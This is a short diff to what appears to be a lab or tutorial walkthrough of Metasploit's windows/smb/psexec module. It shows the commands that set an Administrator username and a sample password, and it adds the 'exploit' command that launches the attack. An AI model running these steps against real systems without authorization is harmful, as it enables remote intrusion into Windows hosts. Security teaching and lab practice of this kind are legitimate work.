@@ -133,6 +133,8 @@ msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`
 
 msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234`
 
+msf6 exploit(windows/smb/psexec) > `exploit`
+
 It should look lie this:
 
 <img width="1139" alt="image" src="https://github.com/user-attachments/assets/9eb2b530-b318-4636-a111-5d6cbe73a906">
